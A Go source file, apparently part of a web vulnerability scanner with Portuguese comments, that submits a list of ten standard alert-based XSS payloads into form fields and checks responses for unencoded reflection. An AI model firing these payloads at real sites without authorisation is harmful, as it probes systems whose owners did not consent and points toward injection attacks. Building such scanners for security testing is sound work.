package scanner

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// XSSPayload representa um payload de teste XSS
type XSSPayload struct {
	Payload     string
	Description string
}

// Payloads avançados para detecção de XSS
var xssPayloads = []XSSPayload{
	{Payload: "<script>alert('XSS')</script>", Description: "Script básico"},
	{Payload: "<img src=x onerror=alert('XSS')>", Description: "Event handler em IMG"},
	{Payload: "<svg/onload=alert('XSS')>", Description: "SVG onload"},
	{Payload: "javascript:alert('XSS')", Description: "JavaScript protocol"},
	{Payload: "<iframe src=javascript:alert('XSS')>", Description: "Iframe javascript"},
	{Payload: "<body onload=alert('XSS')>", Description: "Body onload"},
	{Payload: "'\"><script>alert('XSS')</script>", Description: "Breaking attributes"},
	{Payload: "<img src=\"x\" onerror=\"alert('XSS')\">", Description: "Quoted event handler"},
	{Payload: "<ScRiPt>alert('XSS')</ScRiPt>", Description: "Case variation"},
	{Payload: "<<SCRIPT>alert('XSS');//<</SCRIPT>", Description: "Nested tags"},
}

// XSSResult armazena o resultado de um teste XSS
type XSSResult struct {
	Vulnerable  bool
	Payload     string
	Description string
	Response    string
	Field       string
}

// TestXSS testa vulnerabilidades XSS em um formulário
func TestXSS(form Form, baseURL string, client *http.Client) bool {
	for _, xssPayload := range xssPayloads {
		if testSingleXSS(form, baseURL, client, xssPayload.Payload) {
			return true
		}
		time.Sleep(50 * time.Millisecond) // Rate limiting
	}
	return false
}

// TestXSSDetailed testa XSS e retorna resultados detalhados
func TestXSSDetailed(form Form, baseURL string, client *http.Client) []XSSResult {
	var results []XSSResult

	for _, xssPayload := range xssPayloads {
		for _, field := range form.Inputs {
			data := url.Values{}
			// Preenche outros campos com valores normais
			for _, input := range form.Inputs {
				if input == field {
					data.Set(input, xssPayload.Payload)
				} else {
					data.Set(input, "test")
				}
			}

			target := baseURL + form.Action
			var res *http.Response
			var err error

			if form.Method == "POST" {
				res, err = client.PostForm(target, data)
			} else {
				fullURL := target + "?" + data.Encode()
				res, err = client.Get(fullURL)
			}

			if err != nil {
				continue
			}

			buf := new(strings.Builder)
			io.Copy(buf, res.Body)
			body := buf.String()
			res.Body.Close()

			vulnerable := detectXSS(body, xssPayload.Payload)

			results = append(results, XSSResult{
				Vulnerable:  vulnerable,
				Payload:     xssPayload.Payload,
				Description: xssPayload.Description,
				Response:    truncateString(body, 500),
				Field:       field,
			})

			if vulnerable {
				break // Vulnerável encontrado, não precisa testar outros payloads neste campo
			}

			time.Sleep(50 * time.Millisecond)
		}
	}

	return results
}

func testSingleXSS(form Form, baseURL string, client *http.Client, payload string) bool {
	data := url.Values{}

	for _, input := range form.Inputs {
		data.Set(input, payload)
	}

	target := baseURL + form.Action
	var res *http.Response
	var err error

	if form.Method == "POST" {
		res, err = client.PostForm(target, data)
	} else {
		fullURL := target + "?" + data.Encode()
		res, err = client.Get(fullURL)
	}

	if err != nil {
		return false
	}
	defer res.Body.Close()

	buf := new(strings.Builder)
	io.Copy(buf, res.Body)
	body := buf.String()

	return detectXSS(body, payload)
}

// detectXSS verifica se o payload aparece na resposta de forma vulnerável
func detectXSS(body, payload string) bool {
	// Verifica se o payload aparece sem encoding
	if strings.Contains(body, payload) {
		return true
	}

	// Verifica variações comuns do payload
	variations := []string{
		strings.ToLower(payload),
		strings.ToUpper(payload),
		strings.ReplaceAll(payload, "'", "\""),
	}

	for _, variation := range variations {
		if strings.Contains(strings.ToLower(body), strings.ToLower(variation)) {
			return true
		}
	}

	return false
}
